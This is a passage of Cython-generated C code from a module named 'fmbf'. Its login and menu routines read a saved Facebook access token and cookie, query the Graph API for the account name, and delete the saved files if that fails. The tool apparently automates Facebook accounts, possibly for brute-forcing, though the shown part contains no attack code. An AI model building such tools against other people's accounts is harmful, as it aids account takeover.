      __pyx_t_2 = (__pyx_t_9) ? __Pyx_PyObject_Call2Args(__pyx_t_12, __pyx_t_9, __pyx_int_3) : __Pyx_PyObject_CallOneArg(__pyx_t_12, __pyx_int_3);
      __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
      if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 73, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_2);
      __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

      
      __pyx_t_12 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_menu); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 74, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_12);
      __pyx_t_9 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_12))) {
        __pyx_t_9 = PyMethod_GET_SELF(__pyx_t_12);
        if (likely(__pyx_t_9)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_12);
          __Pyx_INCREF(__pyx_t_9);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_12, function);
        }
      }
      __pyx_t_2 = (__pyx_t_9) ? __Pyx_PyObject_CallOneArg(__pyx_t_12, __pyx_t_9) : __Pyx_PyObject_CallNoArg(__pyx_t_12);
      __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
      if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 74, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_2);
      __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

      
    }
    __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
    __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
    __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
    goto __pyx_L8_try_end;
    __pyx_L3_error:;
    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
    __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;

    
     {
      __Pyx_AddTraceback("fmbf.Main.login", __pyx_clineno, __pyx_lineno, __pyx_filename);
      if (__Pyx_GetException(&__pyx_t_2, &__pyx_t_12, &__pyx_t_9) < 0) __PYX_ERR(0, 75, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_2);
      __Pyx_GOTREF(__pyx_t_12);
      __Pyx_GOTREF(__pyx_t_9);

      
      {
        __Pyx_PyThreadState_declare
        __Pyx_PyThreadState_assign
        __Pyx_ExceptionSave(&__pyx_t_13, &__pyx_t_14, &__pyx_t_15);
        __Pyx_XGOTREF(__pyx_t_13);
        __Pyx_XGOTREF(__pyx_t_14);
        __Pyx_XGOTREF(__pyx_t_15);
         {
          __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_os); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 76, __pyx_L11_error)
          __Pyx_GOTREF(__pyx_t_1);
          __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_remove); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 76, __pyx_L11_error)
          __Pyx_GOTREF(__pyx_t_3);
          __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
          __pyx_t_1 = NULL;
          if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_3))) {
            __pyx_t_1 = PyMethod_GET_SELF(__pyx_t_3);
            if (likely(__pyx_t_1)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
              __Pyx_INCREF(__pyx_t_1);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_3, function);
            }
          }
          __pyx_t_10 = (__pyx_t_1) ? __Pyx_PyObject_Call2Args(__pyx_t_3, __pyx_t_1, __pyx_kp_s_data_cookie_txt) : __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_kp_s_data_cookie_txt);
          __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
          if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 76, __pyx_L11_error)
          __Pyx_GOTREF(__pyx_t_10);
          __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
          __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
        }
        __Pyx_XDECREF(__pyx_t_13); __pyx_t_13 = 0;
        __Pyx_XDECREF(__pyx_t_14); __pyx_t_14 = 0;
        __Pyx_XDECREF(__pyx_t_15); __pyx_t_15 = 0;
        goto __pyx_L18_try_end;
        __pyx_L11_error:;
        __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
        __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
        __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;

        
         {
          __Pyx_ErrRestore(0,0,0);
          goto __pyx_L12_exception_handled;
        }
        __pyx_L12_exception_handled:;
        __Pyx_XGIVEREF(__pyx_t_13);
        __Pyx_XGIVEREF(__pyx_t_14);
        __Pyx_XGIVEREF(__pyx_t_15);
        __Pyx_ExceptionReset(__pyx_t_13, __pyx_t_14, __pyx_t_15);
        __pyx_L18_try_end:;
      }

      
      {
        __Pyx_PyThreadState_declare
        __Pyx_PyThreadState_assign
        __Pyx_ExceptionSave(&__pyx_t_15, &__pyx_t_14, &__pyx_t_13);
        __Pyx_XGOTREF(__pyx_t_15);
        __Pyx_XGOTREF(__pyx_t_14);
        __Pyx_XGOTREF(__pyx_t_13);
         {
          __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_os); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 78, __pyx_L19_error)
          __Pyx_GOTREF(__pyx_t_3);
          __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_remove); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 78, __pyx_L19_error)
          __Pyx_GOTREF(__pyx_t_1);
          __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
          __pyx_t_3 = NULL;
          if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_1))) {
            __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_1);
            if (likely(__pyx_t_3)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_1);
              __Pyx_INCREF(__pyx_t_3);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_1, function);
            }
          }
          __pyx_t_10 = (__pyx_t_3) ? __Pyx_PyObject_Call2Args(__pyx_t_1, __pyx_t_3, __pyx_kp_s_data_token_txt) : __Pyx_PyObject_CallOneArg(__pyx_t_1, __pyx_kp_s_data_token_txt);
          __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
          if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 78, __pyx_L19_error)
          __Pyx_GOTREF(__pyx_t_10);
          __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
          __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
        }
        __Pyx_XDECREF(__pyx_t_15); __pyx_t_15 = 0;
        __Pyx_XDECREF(__pyx_t_14); __pyx_t_14 = 0;
        __Pyx_XDECREF(__pyx_t_13); __pyx_t_13 = 0;
        goto __pyx_L26_try_end;
        __pyx_L19_error:;
        __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
        __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
        __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;

        
         {
          __Pyx_ErrRestore(0,0,0);
          goto __pyx_L20_exception_handled;
        }
        __pyx_L20_exception_handled:;
        __Pyx_XGIVEREF(__pyx_t_15);
        __Pyx_XGIVEREF(__pyx_t_14);
        __Pyx_XGIVEREF(__pyx_t_13);
        __Pyx_ExceptionReset(__pyx_t_15, __pyx_t_14, __pyx_t_13);
        __pyx_L26_try_end:;
      }

      
      __pyx_t_10 = __Pyx_PyObject_Call(__pyx_builtin_exit, __pyx_tuple__10, NULL); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 80, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_10);
      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
      __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
      __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
      __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
      goto __pyx_L4_exception_handled;
    }
    __pyx_L5_except_error:;

    
    __Pyx_XGIVEREF(__pyx_t_6);
    __Pyx_XGIVEREF(__pyx_t_7);
    __Pyx_XGIVEREF(__pyx_t_8);
    __Pyx_ExceptionReset(__pyx_t_6, __pyx_t_7, __pyx_t_8);
    goto __pyx_L1_error;
    __pyx_L4_exception_handled:;
    __Pyx_XGIVEREF(__pyx_t_6);
    __Pyx_XGIVEREF(__pyx_t_7);
    __Pyx_XGIVEREF(__pyx_t_8);
    __Pyx_ExceptionReset(__pyx_t_6, __pyx_t_7, __pyx_t_8);
    __pyx_L8_try_end:;
  }

  

  
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_3);
  __Pyx_XDECREF(__pyx_t_9);
  __Pyx_XDECREF(__pyx_t_10);
  __Pyx_XDECREF(__pyx_t_12);
  __Pyx_AddTraceback("fmbf.Main.login", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_v_cookie);
  __Pyx_XDECREF(__pyx_v_url);
  __Pyx_XDECREF(__pyx_v_regex);
  __Pyx_XDECREF(__pyx_v_get);
  __Pyx_XDECREF(__pyx_v_token);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}




static PyObject *__pyx_pw_4fmbf_4Main_7menu(PyObject *__pyx_self, PyObject *__pyx_v_self); 
static PyMethodDef __pyx_mdef_4fmbf_4Main_7menu = {"menu", (PyCFunction)__pyx_pw_4fmbf_4Main_7menu, METH_O, 0};
static PyObject *__pyx_pw_4fmbf_4Main_7menu(PyObject *__pyx_self, PyObject *__pyx_v_self) {
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("menu (wrapper)", 0);
  __pyx_r = __pyx_pf_4fmbf_4Main_6menu(__pyx_self, ((PyObject *)__pyx_v_self));

  
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_4fmbf_4Main_6menu(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_self) {
  PyObject *__pyx_v_token = NULL;
  PyObject *__pyx_v_cok = NULL;
  PyObject *__pyx_v_cookie = NULL;
  PyObject *__pyx_v_nama = NULL;
  PyObject *__pyx_v_ask = NULL;
  PyObject *__pyx_v_user = NULL;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  PyObject *__pyx_t_4 = NULL;
  PyObject *__pyx_t_5 = NULL;
  PyObject *__pyx_t_6 = NULL;
  PyObject *__pyx_t_7 = NULL;
  PyObject *__pyx_t_8 = NULL;
  PyObject *__pyx_t_9 = NULL;
  PyObject *__pyx_t_10 = NULL;
  PyObject *__pyx_t_11 = NULL;
  PyObject *__pyx_t_12 = NULL;
  Py_ssize_t __pyx_t_13;
  Py_UCS4 __pyx_t_14;
  int __pyx_t_15;
  int __pyx_t_16;
  int __pyx_t_17;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("menu", 0);

  
  {
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ExceptionSave(&__pyx_t_1, &__pyx_t_2, &__pyx_t_3);
    __Pyx_XGOTREF(__pyx_t_1);
    __Pyx_XGOTREF(__pyx_t_2);
    __Pyx_XGOTREF(__pyx_t_3);
     {

      
      __pyx_t_5 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_tuple__11, NULL); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 84, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_read); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 84, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __pyx_t_5 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_6))) {
        __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_6);
        if (likely(__pyx_t_5)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
          __Pyx_INCREF(__pyx_t_5);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_6, function);
        }
      }
      __pyx_t_4 = (__pyx_t_5) ? __Pyx_PyObject_CallOneArg(__pyx_t_6, __pyx_t_5) : __Pyx_PyObject_CallNoArg(__pyx_t_6);
      __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
      if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 84, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __pyx_v_token = __pyx_t_4;
      __pyx_t_4 = 0;

      
      __pyx_t_6 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_tuple__12, NULL); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 85, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_6, __pyx_n_s_read); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 85, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __pyx_t_6 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_5))) {
        __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_5);
        if (likely(__pyx_t_6)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
          __Pyx_INCREF(__pyx_t_6);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_5, function);
        }
      }
      __pyx_t_4 = (__pyx_t_6) ? __Pyx_PyObject_CallOneArg(__pyx_t_5, __pyx_t_6) : __Pyx_PyObject_CallNoArg(__pyx_t_5);
      __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
      if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 85, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __pyx_v_cok = __pyx_t_4;
      __pyx_t_4 = 0;

      
      __pyx_t_4 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 86, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      if (PyDict_SetItem(__pyx_t_4, __pyx_n_s_cookie, __pyx_v_cok) < 0) __PYX_ERR(0, 86, __pyx_L3_error)
      __pyx_v_cookie = ((PyObject*)__pyx_t_4);
      __pyx_t_4 = 0;

      
      __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_ses); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 87, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_get); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 87, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __pyx_t_5 = __Pyx_PyObject_FormatSimple(__pyx_v_token, __pyx_empty_unicode); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 87, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __pyx_t_7 = __Pyx_PyUnicode_Concat(__pyx_kp_u_https_graph_facebook_com_me_acce, __pyx_t_5); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 87, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_7);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __pyx_t_5 = PyTuple_New(1); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 87, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_GIVEREF(__pyx_t_7);
      PyTuple_SET_ITEM(__pyx_t_5, 0, __pyx_t_7);
      __pyx_t_7 = 0;
      __pyx_t_7 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 87, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_7);
      if (PyDict_SetItem(__pyx_t_7, __pyx_n_s_cookies, __pyx_v_cookie) < 0) __PYX_ERR(0, 87, __pyx_L3_error)
      __pyx_t_8 = __Pyx_PyObject_Call(__pyx_t_6, __pyx_t_5, __pyx_t_7); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 87, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_t_8, __pyx_n_s_json); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 87, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_7);
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      __pyx_t_8 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_7))) {
        __pyx_t_8 = PyMethod_GET_SELF(__pyx_t_7);
        if (likely(__pyx_t_8)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_7);
          __Pyx_INCREF(__pyx_t_8);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_7, function);
        }
      }
      __pyx_t_4 = (__pyx_t_8) ? __Pyx_PyObject_CallOneArg(__pyx_t_7, __pyx_t_8) : __Pyx_PyObject_CallNoArg(__pyx_t_7);
      __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
      if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 87, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      __pyx_t_7 = __Pyx_PyObject_Dict_GetItem(__pyx_t_4, __pyx_n_s_name); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 87, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_7);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __pyx_v_nama = __pyx_t_7;
      __pyx_t_7 = 0;

      
    }
    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    goto __pyx_L8_try_end;
    __pyx_L3_error:;
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
    __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
    __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
    __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;

    
     {
      __Pyx_AddTraceback("fmbf.Main.menu", __pyx_clineno, __pyx_lineno, __pyx_filename);
      if (__Pyx_GetException(&__pyx_t_7, &__pyx_t_4, &__pyx_t_8) < 0) __PYX_ERR(0, 88, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_7);
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_GOTREF(__pyx_t_8);

      
      {
        __Pyx_PyThreadState_declare
        __Pyx_PyThreadState_assign
        __Pyx_ExceptionSave(&__pyx_t_9, &__pyx_t_10, &__pyx_t_11);
        __Pyx_XGOTREF(__pyx_t_9);
        __Pyx_XGOTREF(__pyx_t_10);
        __Pyx_XGOTREF(__pyx_t_11);
         {
          __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_os); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 89, __pyx_L11_error)
          __Pyx_GOTREF(__pyx_t_6);
          __pyx_t_12 = __Pyx_PyObject_GetAttrStr(__pyx_t_6, __pyx_n_s_remove); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 89, __pyx_L11_error)
          __Pyx_GOTREF(__pyx_t_12);
          __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
          __pyx_t_6 = NULL;
          if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_12))) {
            __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_12);
            if (likely(__pyx_t_6)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_12);
              __Pyx_INCREF(__pyx_t_6);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_12, function);
            }
          }
          __pyx_t_5 = (__pyx_t_6) ? __Pyx_PyObject_Call2Args(__pyx_t_12, __pyx_t_6, __pyx_kp_s_cookie_txt) : __Pyx_PyObject_CallOneArg(__pyx_t_12, __pyx_kp_s_cookie_txt);
          __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
          if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 89, __pyx_L11_error)
          __Pyx_GOTREF(__pyx_t_5);
          __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
          __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        }
        __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
        __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
        __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
        goto __pyx_L18_try_end;
        __pyx_L11_error:;
        __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
        __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
        __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;

        
         {
          __Pyx_ErrRestore(0,0,0);
          goto __pyx_L12_exception_handled;
        }
        __pyx_L12_exception_handled:;
        __Pyx_XGIVEREF(__pyx_t_9);
        __Pyx_XGIVEREF(__pyx_t_10);
        __Pyx_XGIVEREF(__pyx_t_11);
        __Pyx_ExceptionReset(__pyx_t_9, __pyx_t_10, __pyx_t_11);
        __pyx_L18_try_end:;
      }

      
      {
        __Pyx_PyThreadState_declare
        __Pyx_PyThreadState_assign
        __Pyx_ExceptionSave(&__pyx_t_11, &__pyx_t_10, &__pyx_t_9);
        __Pyx_XGOTREF(__pyx_t_11);
        __Pyx_XGOTREF(__pyx_t_10);
        __Pyx_XGOTREF(__pyx_t_9);
         {
          __Pyx_GetModuleGlobalName(__pyx_t_12, __pyx_n_s_os); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 91, __pyx_L19_error)
          __Pyx_GOTREF(__pyx_t_12);
          __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_t_12, __pyx_n_s_remove); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 91, __pyx_L19_error)
          __Pyx_GOTREF(__pyx_t_6);
          __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
          __pyx_t_12 = NULL;
          if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_6))) {
            __pyx_t_12 = PyMethod_GET_SELF(__pyx_t_6);
            if (likely(__pyx_t_12)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
              __Pyx_INCREF(__pyx_t_12);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_6, function);
            }
          }
          __pyx_t_5 = (__pyx_t_12) ? __Pyx_PyObject_Call2Args(__pyx_t_6, __pyx_t_12, __pyx_kp_s_token_txt) : __Pyx_PyObject_CallOneArg(__pyx_t_6, __pyx_kp_s_token_txt);
          __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
          if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 91, __pyx_L19_error)
          __Pyx_GOTREF(__pyx_t_5);
          __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
          __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        }
        __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
        __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
        __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
        goto __pyx_L26_try_end;
        __pyx_L19_error:;
        __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
        __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
        __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;

        
         {
          __Pyx_ErrRestore(0,0,0);
          goto __pyx_L20_exception_handled;
        }
        __pyx_L20_exception_handled:;
        __Pyx_XGIVEREF(__pyx_t_11);
        __Pyx_XGIVEREF(__pyx_t_10);
        __Pyx_XGIVEREF(__pyx_t_9);
        __Pyx_ExceptionReset(__pyx_t_11, __pyx_t_10, __pyx_t_9);
        __pyx_L26_try_end:;
      }

      
      __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_login); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 93, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_6);
      __pyx_t_12 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_6))) {
        __pyx_t_12 = PyMethod_GET_SELF(__pyx_t_6);
        if (likely(__pyx_t_12)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
          __Pyx_INCREF(__pyx_t_12);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_6, function);
        }
      }
      __pyx_t_5 = (__pyx_t_12) ? __Pyx_PyObject_CallOneArg(__pyx_t_6, __pyx_t_12) : __Pyx_PyObject_CallNoArg(__pyx_t_6);
      __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
      if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 93, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
      __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
      __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
      goto __pyx_L4_exception_handled;
    }
    __pyx_L5_except_error:;

    
    __Pyx_XGIVEREF(__pyx_t_1);
    __Pyx_XGIVEREF(__pyx_t_2);
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_2, __pyx_t_3);
    goto __pyx_L1_error;
    __pyx_L4_exception_handled:;
    __Pyx_XGIVEREF(__pyx_t_1);
    __Pyx_XGIVEREF(__pyx_t_2);
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_2, __pyx_t_3);
    __pyx_L8_try_end:;
  }

  
  __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_logo); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 94, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __pyx_t_7 = NULL;
  if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_4))) {
    __pyx_t_7 = PyMethod_GET_SELF(__pyx_t_4);
    if (likely(__pyx_t_7)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
      __Pyx_INCREF(__pyx_t_7);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_4, function);
    }
  }
  __pyx_t_8 = (__pyx_t_7) ? __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_t_7) : __Pyx_PyObject_CallNoArg(__pyx_t_4);
  __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
  if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 94, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_8);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;

  
  __pyx_t_8 = PyTuple_New(3); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 95, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_8);
  __pyx_t_13 = 0;
  __pyx_t_14 = 127;
  __Pyx_INCREF(__pyx_kp_u__2);
  __pyx_t_13 += 1;
